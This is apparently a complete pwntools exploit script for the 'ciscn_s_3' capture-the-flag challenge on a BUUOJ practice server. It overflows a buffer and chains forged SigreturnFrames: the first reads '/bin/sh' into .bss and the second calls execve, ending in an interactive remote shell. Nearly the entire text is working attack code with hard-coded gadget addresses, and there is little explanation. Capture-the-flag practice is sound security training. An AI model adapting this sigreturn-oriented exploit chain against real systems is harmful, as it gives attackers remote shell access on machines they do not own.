from pwn import *
context.arch='amd64'

elf = ELF('./ciscn_s_3')
bss_addr = elf.bss()
syscall_addr = 0x0400517 # syscall; ret;
# p = process('./ciscn_s_3')
p = remote('node3.buuoj.cn',28496)

def bySROP(p):
	# read the '/bin/sh' and call execve('bin/sh',0,0) by frame_read
	# the process call execve('bin/sh',0,0) was execved by frame_execve
	set_rax = 0x4004da # mov    $0xf,%rax; retq;
	# the singreturn number is 0xf in amd64

	frame_read = SigreturnFrame()
	frame_read.rax = constants.SYS_read
	frame_read.rdi = 0
	frame_read.rsi = bss_addr	# read payload to bss which include strings 'bin/sh'
	frame_read.rdx = 0x300
	frame_read.rsp = bss_addr+0x10 # after call read, pass the strings '/bin/sh' to call execve('bin/sh',0,0)
	frame_read.rip = syscall_addr

	payload = 'A'*0x10 + flat([set_rax, syscall_addr])
	payload += str(frame_read)
	p.send(payload)
	sleep(1)

	frame_execve = SigreturnFrame()
	frame_execve.rax = constants.SYS_execve
	frame_execve.rdi = bss_addr
	frame_execve.rsi = 0
	frame_execve.rdx = 0
	frame_execve.rip = syscall_addr

	payload = '/bin/sh\x00'
	payload += 'A'*(0x10-len(payload))
	payload += flat([set_rax,syscall_addr])
	payload += str(frame_execve)

	p.send(payload)
	sleep(1)
	p.interactive()

bySROP(p)